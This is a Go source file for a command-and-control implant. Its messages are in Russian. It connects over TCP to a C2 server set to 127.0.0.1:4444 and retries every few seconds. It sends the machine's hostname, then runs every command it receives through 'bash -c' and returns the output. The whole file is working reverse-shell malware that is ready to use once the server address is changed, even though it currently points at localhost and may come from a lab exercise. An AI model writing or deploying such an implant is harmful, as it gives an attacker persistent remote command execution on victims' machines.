package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

const (
	serverIP = "127.0.0.1"
	serverPort = "4444"
)

func main() {
	// бесконечный цикл
	for {
		conn, err := net.Dial("tcp", serverIP+":"+serverPort)
		if err != nil {
			fmt.Println("[!] Не удалось подключиться к C2, повтор через 10 сек:", err)
			time.Sleep(time.Second * 10)
			continue
		}

		fmt.Println("[+] Подключение к C2 установленно")
		handleConnection(conn)
		conn.Close()

		time.Sleep(time.Second * 5)
	}
}

func handleConnection(conn net.Conn) {
	hostname, _ := os.Hostname()
	_, err := conn.Write([]byte(hostname+"\n"))
	if err != nil {
		fmt.Println("[-] Ошибка отправки приветствия: ", err)
		return
	}

	reader := bufio.NewReader(conn)

	for {
		conn.SetReadDeadline(time.Now().Add(time.Second * 60))

		cmdLine, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("[-] Ошибка чтения команды (возможно, таймаут): ", err)
			return
		}

		cmdLine = strings.TrimSpace(cmdLine)

		if cmdLine == "" {
			continue
		}
		fmt.Printf("[*] Получена команда: %s\n", cmdLine)
		
		cmd := exec.Command("bash", "-c", cmdLine)
		output, err := cmd.CombinedOutput()
		if err != nil {
			output = append(output, []byte("\nError: "+err.Error())...)
		}

		_, err = conn.Write(append(output, '\n'))
		if err != nil {
			fmt.Println("[-] Ошибка отправки результата: ", err)
			return
		}
	}
}
